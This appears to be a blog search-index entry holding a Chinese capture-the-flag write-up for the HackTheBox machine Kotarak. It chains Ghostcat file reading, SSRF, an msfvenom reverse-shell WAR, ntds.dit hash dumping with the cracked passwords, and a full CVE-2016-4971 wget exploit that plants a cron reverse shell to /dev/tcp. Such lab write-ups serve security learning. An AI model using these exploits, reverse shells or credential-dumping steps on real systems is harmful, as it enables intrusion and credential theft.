<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>HTB之Kotarak</title>
    <url>/2022/06/18/HTB%E4%B9%8BKotarak/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Kotarak这题难度为Hard，涉及的技术点还是挺多的，打下来还是收获不少，值得玩一玩儿</p>
<h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><p>扫描开放端口</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nmap <span class="literal">-p-</span> <span class="literal">--min-rate</span> <span class="number">10000</span> <span class="number">10.10</span>.<span class="number">10.55</span></span><br></pre></td></tr></table></figure>

<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_z2Y48beZfD.png" class="">

<p>针对开放端口使用脚本扫描</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 22,8009,8080,60000 -sC 10.10.10.55</span><br></pre></td></tr></table></figure>

<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_gwKNhD_F9_.png" class="">

<p>可以看到开放了8009端口（ajp协议），可以想到Tomcat的幽灵猫漏洞（文件读取+文件包含）</p>
<h1 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h1><p>访问8080的tomcat管理页面，尝试了几个弱密码登录，登录失败</p>
<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_wcmrPPCo_k.png" class="">

<h1 id="8009"><a href="#8009" class="headerlink" title="8009"></a>8009</h1><p>前面端口扫描出了8009端口，searchsploit搜索下8009的<code>Ghostcat</code>漏洞</p>
<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_izfKM0NW9C.png" class="">

<p>查看exp使用方法</p>
<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_BE5h5SUunF.png" class="">

<p>尝试读取<code>WEB-INF/web.xml</code>文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 /usr/share/exploitdb/exploits/multiple/webapps/48143.py -p 8009 -f WEB-INF/web.xml 10.10.10.55</span><br></pre></td></tr></table></figure>

<p>读取成功</p>
<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_NUu5gd75yW.png" class="">

<p>但只能读取<code>webapps</code>目录下文件，进一步利用需要知道目录下的文件，或使用文件包含结合文件上传，这里先放一放</p>
<h1 id="60000"><a href="#60000" class="headerlink" title="60000"></a>60000</h1><p>访问60000端口，提示一个web隐私浏览器</p>
<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_H_aLerZDFN.png" class="">

<p>尝试在输入框中随便填写<code>123</code>提交，可以看到url中将输入拼接到了<code>url.php?path=</code>后</p>
<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_ZFNiqkEIxZ.png" class="">

<p>根据url的路径可以猜想到SSRF，尝试将path修改为<code>127.0.0.1:60000</code>，发现确实可以SSRF</p>
<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_IYYtysWBRn.png" class="">

<p>尝试使用file协议访问<code>/etc/passwd</code>提示<code>try harder</code>，说明访问可能有限制</p>
<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_JRndUXiTtP.png" class="">

<p>参考网上脚本，遍历1-1000以内的本地开放的端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 0 1000); <span class="keyword">do</span> <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$i</span>: &quot;</span>;curl -s http://10.10.10.55:60000/url.php?path=localhost:<span class="variable">$i</span> ; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>查看扫描出的的开放端口，有320、888两个有web页面的端口</p>
<p>320端口是一个登录页面，没有账号密码没法登录</p>
<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_haxSEwvXq4.png" class="">

<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_DyDUsbzP3u.png" class="">

<p>888端口是一个静态资源页面</p>
<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_Z3nxuOkUuL.png" class="">

<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_fsosO_7pF9.png" class="">

<p>可以看到每个文件的链接都是<code>http://10.10.10.55:60000/url.php?doc=</code>开头，直接点击访问是跳转<code>10.10.10.55</code></p>
<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_afg-5LRhVh.png" class="">

<p>不是ssrf访问会看不到文件内容，所以尝试用前面的ssrf访问backup，发现<code>admin</code>&#x2F;<code>3@g01PdhB!</code>账号密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">10.10.10.55:60000/url.php?path=127.0.0.1:888?doc=backup</span><br></pre></td></tr></table></figure>

<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_xomTOA0NAW.png" class="">

<p>尝试使用该账号密码登录8080端口的tomcat管理页面</p>
<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_iRHh7VmwH8.png" class="">

<h1 id="上传恶意war包"><a href="#上传恶意war包" class="headerlink" title="上传恶意war包"></a>上传恶意war包</h1><p>使用<code>msfvenom</code>生产恶意war包并上传</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.15 LPORT=443 -f war -o rev.war</span><br><span class="line">Payload size: 13314 bytes</span><br><span class="line">Final size of war file: 13314 bytes</span><br><span class="line">Saved as: rev.war</span><br></pre></td></tr></table></figure>

<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_PBM3QwE_j6.png" class="">

<p>访问url即可在443端口接收到shell</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://10.10.10.55:8080/rev</span><br></pre></td></tr></table></figure>

<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_vigyUMtnvz.png" class="">

<p>通过<a class="link"   href="https://github.com/Fahrj/reverse-ssh"  title="reverse-ssh工具">reverse-ssh工具<i class="fas fa-external-link-alt"></i></a>升级交互式shell</p>
<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_kZsiEJsV8A.png" class="">

<h1 id="提权至atanas用户"><a href="#提权至atanas用户" class="headerlink" title="提权至atanas用户"></a>提权至atanas用户</h1><p>查看flag文件<code>/home/atanas/user.txt</code>提示无权限，所以这里要先提权到atanas用户，查看当前用户目录<code>/home/tomcat</code>下所有文件，发现windows注册表文件和<code>ntds.dit</code>文件</p>
<p><code>ntds.dit </code>文件是一个存储 Active Directory 数据的数据库，通常在在域控中，包括有关用户对象、组和组成员的信息，并且该文件还存储域中所有用户的密码哈希，</p>
<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_4PaPBZ1yK1.png" class="">

<h2 id="dumphash"><a href="#dumphash" class="headerlink" title="dumphash"></a>dumphash</h2><p>将上面的<code>.dit</code>和<code>.bin</code>拉到kali本地，kali集成<code>impacket</code>工具箱里的<code>impacket-secretsdump</code>命令可以就可以提取用户的密码hash</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ impacket-secretsdump -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -system 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin LOCAL</span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x14b6fb98fedc8e15107867c4722d1399</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching <span class="keyword">for</span> pekList, be patient</span><br><span class="line">[*] PEK <span class="comment"># 0 found and decrypted: d77ec2af971436bccb3b6fc4a969d7ff</span></span><br><span class="line">[*] Reading and decrypting hashes from 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::</span><br><span class="line">WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487:::</span><br><span class="line">WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279:::</span><br><span class="line">WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772:::</span><br><span class="line">WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c:::</span><br><span class="line">atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::</span><br><span class="line">[*] Kerberos keys from 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit </span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:6c53b16d11a496d0535959885ea7c79c04945889028704e2a4d1ca171e4374e2</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:e2a25474aa9eb0e1525d0f50233c0274</span><br><span class="line">Administrator:des-cbc-md5:75375eda54757c2f</span><br><span class="line">WIN-3G2B0H151AC$:aes256-cts-hmac-sha1-96:84e3d886fe1a81ed415d36f438c036715fd8c9e67edbd866519a2358f9897233</span><br><span class="line">WIN-3G2B0H151AC$:aes128-cts-hmac-sha1-96:e1a487ca8937b21268e8b3c41c0e4a74</span><br><span class="line">WIN-3G2B0H151AC$:des-cbc-md5:b39dc12a920457d5</span><br><span class="line">WIN-3G2B0H151AC$:rc4_hmac:668d49ebfdb70aeee8bcaeac9e3e66fd</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:14134e1da577c7162acb1e01ea750a9da9b9b717f78d7ca6a5c95febe09b35b8</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:8b96c9c8ea354109b951bfa3f3aa4593</span><br><span class="line">krbtgt:des-cbc-md5:10ef08047a862046</span><br><span class="line">krbtgt:rc4_hmac:ca1ccefcb525db49828fbb9d68298eee</span><br><span class="line">WIN2K8$:aes256-cts-hmac-sha1-96:289dd4c7e01818f179a977fd1e35c0d34b22456b1c8f844f34d11b63168637c5</span><br><span class="line">WIN2K8$:aes128-cts-hmac-sha1-96:deb0ee067658c075ea7eaef27a605908</span><br><span class="line">WIN2K8$:des-cbc-md5:d352a8d3a7a7380b</span><br><span class="line">WIN2K8$:rc4_hmac:160f6c1db2ce0994c19c46a349611487</span><br><span class="line">WINXP1$:aes256-cts-hmac-sha1-96:347a128a1f9a71de4c52b09d94ad374ac173bd644c20d5e76f31b85e43376d14</span><br><span class="line">WINXP1$:aes128-cts-hmac-sha1-96:0e4c937f9f35576756a6001b0af04ded</span><br><span class="line">WINXP1$:des-cbc-md5:984a40d5f4a815f2</span><br><span class="line">WINXP1$:rc4_hmac:6f5e87fd20d1d8753896f6c9cb316279</span><br><span class="line">WIN2K31$:aes256-cts-hmac-sha1-96:f486b86bda928707e327faf7c752cba5bd1fcb42c3483c404be0424f6a5c9f16</span><br><span class="line">WIN2K31$:aes128-cts-hmac-sha1-96:1aae3545508cfda2725c8f9832a1a734</span><br><span class="line">WIN2K31$:des-cbc-md5:4cbf2ad3c4f75b01</span><br><span class="line">WIN2K31$:rc4_hmac:cdd7a7f43d06b3a91705900a592f3772</span><br><span class="line">WIN7$:aes256-cts-hmac-sha1-96:b9921a50152944b5849c706b584f108f9b93127f259b179afc207d2b46de6f42</span><br><span class="line">WIN7$:aes128-cts-hmac-sha1-96:40207f6ef31d6f50065d2f2ddb61a9e7</span><br><span class="line">WIN7$:des-cbc-md5:89a1673723ad9180</span><br><span class="line">WIN7$:rc4_hmac:24473180acbcc5f7d2731abe05cfa88c</span><br><span class="line">atanas:aes256-cts-hmac-sha1-96:933a05beca1abd1a1a47d70b23122c55de2fedfc855d94d543152239dd840ce2</span><br><span class="line">atanas:aes128-cts-hmac-sha1-96:d1db0c62335c9ae2508ee1d23d6efca4</span><br><span class="line">atanas:des-cbc-md5:6b80e391f113542a</span><br><span class="line">[*] Cleaning up...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接着将<code>:::</code>符号前面的最后一段hash取出，通过<code>hashcat</code>或一些在线hash破解的网站，如</p>
<p><a class="link"   href="https://crackstation.net/"  title="https://crackstation.net/">https://crackstation.net/<i class="fas fa-external-link-alt"></i></a>和<a class="link"   href="https://hashes.com/en/decrypt/hash"  title="https://hashes.com/en/decrypt/hash">https://hashes.com/en/decrypt/hash<i class="fas fa-external-link-alt"></i></a></p>
<p>查出<code>atanas</code>用户的明文密码为<code>Password123!</code>，<code>Administrator</code>密码为<code>f16tomcat!</code></p>
<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_tmnztcASxP.png" class="">

<p>尝试用这两个密码ssh登录<code>atanas</code>用户失败，应该是这账号被禁止ssh登录了，尝试用<code>tomcat</code>用户su到<code>atanas</code>，密码为<code>f16tomcat!</code>，登录成功</p>
<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_Bx-FFN9-lb.png" class="">

<h1 id="提权至root"><a href="#提权至root" class="headerlink" title="提权至root"></a>提权至root</h1><h2 id="10-0-3-133"><a href="#10-0-3-133" class="headerlink" title="10.0.3.133"></a>10.0.3.133</h2><p><code>atanas</code>用户可以直接查看<code>/root/</code>目录下文件，查看<code>flag.txt</code>文件并无<code>flag</code>，通过<code>access.log</code>文件可以发现有台机器使用了低版本的<code>wget</code>请求<code>/archive.tar.gz</code>路径，并且每次请求间隔是2分钟</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">atanas@kotarak-dmz:/root$ <span class="built_in">cat</span> app.log </span><br><span class="line">10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] <span class="string">&quot;GET /archive.tar.gz HTTP/1.1&quot;</span> 404 503 <span class="string">&quot;-&quot;</span> <span class="string">&quot;Wget/1.16 (linux-gnu)&quot;</span></span><br><span class="line">10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] <span class="string">&quot;GET /archive.tar.gz HTTP/1.1&quot;</span> 404 503 <span class="string">&quot;-&quot;</span> <span class="string">&quot;Wget/1.16 (linux-gnu)&quot;</span></span><br><span class="line">10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] <span class="string">&quot;GET /archive.tar.gz HTTP/1.1&quot;</span> 404 503 <span class="string">&quot;-&quot;</span> <span class="string">&quot;Wget/1.16 (linux-gnu)&quot;</span></span><br><span class="line">atanas@kotarak-dmz:/root$ <span class="built_in">cat</span> flag.txt</span><br><span class="line">Getting closer! But what you are looking <span class="keyword">for</span> can<span class="string">&#x27;t be found here.</span></span><br><span class="line"><span class="string">atanas@kotarak-dmz:/root$ </span></span><br></pre></td></tr></table></figure>

<p>使用<code>find</code>命令查看本地并没有<code>archive.tar.gz</code>，使用<code>ping</code>日志中的<code>10.0.3.133</code>来源IP，发现可以ping通，可以想到是要拿下<code>10.0.3.133</code>机器的权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">atanas@kotarak-dmz:/root$ find / -name archive.tar.gz 2&gt;/dev/null</span><br><span class="line">atanas@kotarak-dmz:/root$                                        </span><br><span class="line">atanas@kotarak-dmz:/root$ ping 10.0.3.133                        </span><br><span class="line">PING 10.0.3.133 (10.0.3.133) 56(84) bytes of data.</span><br><span class="line">64 bytes from 10.0.3.133: icmp_seq=1 ttl=64 time=0.066 ms</span><br><span class="line">64 bytes from 10.0.3.133: icmp_seq=2 ttl=64 time=0.095 ms</span><br><span class="line">^C</span><br><span class="line">--- 10.0.3.133 ping statistics ---</span><br><span class="line">2 packets transmitted, 2 received, 0% packet loss, time 999ms</span><br><span class="line">rtt min/avg/max/mdev = 0.066/0.080/0.095/0.017 ms</span><br><span class="line">atanas@kotarak-dmz:/root$ </span><br></pre></td></tr></table></figure>

<h2 id="wget漏洞"><a href="#wget漏洞" class="headerlink" title="wget漏洞"></a>wget漏洞</h2><p>使用<code>searchsploit</code>查下<code>wget</code>的漏洞，在<code>wget</code>版本低于<code>1.18</code>可以rce，而目标版本使用的是<code>1.16</code>，符合条件</p>
<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_uYRoWq3huZ.png" class="">

<p>下面介绍下该漏洞（CVE-2016-4971），更多漏洞详情和poc可参考<a class="link"   href="https://www.exploit-db.com/exploits/40064"  title="https://www.exploit-db.com/exploits/40064">https://www.exploit-db.com/exploits/40064<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="CVE-2016-4971"><a href="#CVE-2016-4971" class="headerlink" title="CVE-2016-4971"></a>CVE-2016-4971</h2><p><code>wget</code>默认情况下是将请求url中的文件名作为下载到本地的文件名，例如<code>wget</code>请求<code>http://website.com/folder/file.txt</code>，文件会保存在当前目录下，文件名为<code>file.txt</code></p>
<p>在<code>wget</code>版本低于<code>1.18</code>时，若<code>wget</code>的<code>http</code>目标存在<code>30x</code>跳转到一个<code>ftp</code>地址，本地保存的文件名将会是<code>ftp</code>上的文件名，而忽略掉<code>http</code>目标的文件名。</p>
<p>例如用户请求<code>wget http://attackers-server/safe_file.txt</code>，攻击者可以构造一个302返回，将请求跳转到包含恶意文件的ftp服务器上</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>private</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>ftp://attackers-server/.bash_profile</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>262</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache</span><br></pre></td></tr></table></figure>

<p>用户最后下载的文件将是<code>.bash_profile</code>，而<code>safe_file.txt</code>将会被忽略。</p>
<p>上面的利用只能下载到当前文件夹下，其实我们可以通过覆盖<code>wget</code>的配置文件来控制写入路径。</p>
<p><code>wget</code>配置文件可以控制<code>wget</code>写入目录、post文件、http代理等，详细配置信息见<a class="link"   href="https://www.gnu.org/software/wget/manual/wget.html#Wgetrc-Commands"  title="官网">官网<i class="fas fa-external-link-alt"></i></a>。<code>wget</code>配置文件默认会先从<code>/usr/local/etc/wgetrc</code>路径或环境变量<code>WGETRC</code>设置的路径读取，若都没有，则会从<code>$HOME/.wgetrc</code>读取配置。当<code>wget</code>是被定时任务执行时，文件的下载目录默认是执行用户的home目录，我们就可以在home目录下写入<code>.wgetrc</code>文件来配置<code>wget</code>的写入路径，可以通过写入定时任务、<code>~/.bashrc</code>(有的发行版为<code>~/.bash_profile</code>)来反弹shell，或在web目录写入<code>webshell</code>等操作。</p>
<p>所以我们接下来将靶机<code>10.10.10.55</code>（内网ip为<code>10.0.3.1</code>）作为攻击机，而<code>10.0.3.133</code>作为用户机，利用wget漏洞来获取<code>10.0.3.133</code>的权限。</p>
<p>由于需要运行exp的同时使用nc监听反弹的shell，就需要用到两个终端，可以反弹2个不同端口sehll或使用<code>tmux</code>分屏（单一会话，推荐使用），下面是tmux设置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># TERM的值可在kali终端运行echo $TERM获取</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm-256color </span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置终端大小，可在kali终端运行stty -a查看</span></span><br><span class="line"><span class="built_in">stty</span> rows 48</span><br><span class="line"><span class="built_in">stty</span> columns 236</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行tmux，ctrl+b激活终端，tmux使用说明可参考https://www.ruanyifeng.com/blog/2019/10/tmux.html</span></span><br><span class="line">tmux</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>分屏效果如下</p>
<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_WadiibIlCy.png" class="">

<p>通过首先在<code>10.0.3.1</code>上启动一个ftp服务器，将恶意的<code>.wgetrc</code>配置文件方在ftp服务器下，由于是非root用户启动小于<code>1024</code>的端口号，所以需要用到<code>authbind</code>命令。然后监听接收shell的9999端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">atanas@kotarak-dmz:/tmp$ <span class="built_in">cat</span> &lt;&lt;<span class="string">_EOF_&gt;.wgetrc</span></span><br><span class="line"><span class="string">post_file = /root/root.txt</span></span><br><span class="line"><span class="string">output_document = /etc/cron.d/wget-root-shell</span></span><br><span class="line"><span class="string">_EOF_</span></span><br><span class="line">atanas@kotarak-dmz:/tmp$ authbind python -m pyftpdlib -p21 -w                                                         </span><br><span class="line">/usr/local/lib/python2.7/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to ano</span><br><span class="line">nymous user.                                                                                                          </span><br><span class="line">  RuntimeWarning)                                                           </span><br><span class="line">[I 2022-06-18 05:52:51] &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=29992 &lt;&lt;&lt;</span><br><span class="line">[I 2022-06-18 05:52:51] concurrency model: async</span><br><span class="line">[I 2022-06-18 05:52:51] masquerade (NAT) address: None</span><br><span class="line">[I 2022-06-18 05:52:51] passive ports: None</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">atanas@kotarak-dmz:/tmp$ nc -lvp 9999</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 9999)   </span><br><span class="line">                                               </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面<code>.wgetrc</code>配置文件的<code>post_file</code>配置表示，所有<code>wget</code>的请求都使用<code>post</code>方法发送，并将设置的文件作为<code>post</code>请求体发送，等同于<code>--post-file=</code>命令的作用。<code>output_document</code>配置表示输出的文件路径和名称，等同于<code>-O</code>参数。</p>
<p>接着编辑下面的exp.py并在靶机启动，作用就是启动一个http服务器（<code>10.0.3.1</code>），用于接收来自同网段的<code>10.0.3.133</code>的定时<code>wget</code>请求，当请求为<code>get</code>时，转发到ftp服务器（kali <code>10.10.14.5</code>）下载<code>.wgetrc</code>文件，当请求为<code>post</code>时，返回内容为反弹shell的定时任务语句</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Wget 1.18 &lt; Arbitrary File Upload Exploit</span></span><br><span class="line"><span class="comment"># Dawid Golunski</span></span><br><span class="line"><span class="comment"># dawid( at )legalhackers.com</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># http://legalhackers.com/advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.txt</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># CVE-2016-4971 </span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> SimpleHTTPServer</span><br><span class="line"><span class="keyword">import</span> SocketServer</span><br><span class="line"><span class="keyword">import</span> socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">wgetExploit</span>(SimpleHTTPServer.SimpleHTTPRequestHandler):</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="comment"># This takes care of sending .wgetrc</span></span><br><span class="line"></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;We have a volunteer requesting &quot;</span> + self.path + <span class="string">&quot; by GET :)\n&quot;</span></span><br><span class="line">       <span class="keyword">if</span> <span class="string">&quot;Wget&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> self.headers.getheader(<span class="string">&#x27;User-Agent&#x27;</span>):</span><br><span class="line">          <span class="built_in">print</span> <span class="string">&quot;But it&#x27;s not a Wget :( \n&quot;</span></span><br><span class="line">          self.send_response(<span class="number">200</span>)</span><br><span class="line">          self.end_headers()</span><br><span class="line">          self.wfile.write(<span class="string">&quot;Nothing to see here...&quot;</span>)</span><br><span class="line">          <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;Uploading .wgetrc via ftp redirect vuln. It should land in /root \n&quot;</span></span><br><span class="line">       self.send_response(<span class="number">301</span>)</span><br><span class="line">       new_path = <span class="string">&#x27;%s&#x27;</span>%(<span class="string">&#x27;ftp://anonymous@%s:%s/.wgetrc&#x27;</span>%(FTP_HOST, FTP_PORT) )</span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;Sending redirect to %s \n&quot;</span>%(new_path)</span><br><span class="line">       self.send_header(<span class="string">&#x27;Location&#x27;</span>, new_path)</span><br><span class="line">       self.end_headers()</span><br><span class="line"></span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="comment"># In here we will receive extracted file and install a PoC cronjob</span></span><br><span class="line"></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;We have a volunteer requesting &quot;</span> + self.path + <span class="string">&quot; by POST :)\n&quot;</span></span><br><span class="line">       <span class="keyword">if</span> <span class="string">&quot;Wget&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> self.headers.getheader(<span class="string">&#x27;User-Agent&#x27;</span>):</span><br><span class="line">          <span class="built_in">print</span> <span class="string">&quot;But it&#x27;s not a Wget :( \n&quot;</span></span><br><span class="line">          self.send_response(<span class="number">200</span>)</span><br><span class="line">          self.end_headers()</span><br><span class="line">          self.wfile.write(<span class="string">&quot;Nothing to see here...&quot;</span>)</span><br><span class="line">          <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">       content_len = <span class="built_in">int</span>(self.headers.getheader(<span class="string">&#x27;content-length&#x27;</span>, <span class="number">0</span>))</span><br><span class="line">       post_body = self.rfile.read(content_len)</span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;Received POST from wget, this should be the extracted /etc/shadow file: \n\n---[begin]---\n %s \n---[eof]---\n\n&quot;</span> % (post_body)</span><br><span class="line"></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;Sending back a cronjob script as a thank-you for the file...&quot;</span> </span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;It should get saved in /etc/cron.d/wget-root-shell on the victim&#x27;s host (because of .wgetrc we injected in the GET first response)&quot;</span></span><br><span class="line">       self.send_response(<span class="number">200</span>)</span><br><span class="line">       self.send_header(<span class="string">&#x27;Content-type&#x27;</span>, <span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">       self.end_headers()</span><br><span class="line">       self.wfile.write(ROOT_CRON)</span><br><span class="line"></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;\nFile was served. Check on /root/hacked-via-wget on the victim&#x27;s host in a minute! :) \n&quot;</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">HTTP_LISTEN_IP = <span class="string">&#x27;10.0.3.1&#x27;</span></span><br><span class="line">HTTP_LISTEN_PORT = <span class="number">80</span></span><br><span class="line">FTP_HOST = <span class="string">&#x27;10.0.3.1&#x27;</span></span><br><span class="line">FTP_PORT = <span class="number">21</span></span><br><span class="line"></span><br><span class="line">ROOT_CRON = <span class="string">&quot;* * * * * root bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.0.3.1/9999 0&gt;&amp;1&#x27; \n&quot;</span></span><br><span class="line"></span><br><span class="line">handler = SocketServer.TCPServer((HTTP_LISTEN_IP, HTTP_LISTEN_PORT), wgetExploit)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Ready? Is your FTP server running?&quot;</span></span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">result = sock.connect_ex((FTP_HOST, FTP_PORT))</span><br><span class="line"><span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;FTP found open on %s:%s. Let&#x27;s go then\n&quot;</span> % (FTP_HOST, FTP_PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;FTP is down :( Exiting.&quot;</span></span><br><span class="line">   exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Serving wget exploit on port %s...\n\n&quot;</span> % HTTP_LISTEN_PORT</span><br><span class="line"></span><br><span class="line">handler.serve_forever()</span><br></pre></td></tr></table></figure>

<p>运行exp后过几分钟即可在<code>9999</code>端口接收到shell</p>
<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_JOY8R6gUW9.png" class="">

<p>查看权限为root，ip为<code>10.0.3.133</code>，查看flag即可</p>
<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_iHlr_XWoQx.png" class="">

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a class="link"   href="https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html#http---tcp-60000"  title="https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html#http---tcp-60000">https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html#http---tcp-60000<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.exploit-db.com/exploits/40064"  title="https://www.exploit-db.com/exploits/40064">https://www.exploit-db.com/exploits/40064<i class="fas fa-external-link-alt"></i></a></p>
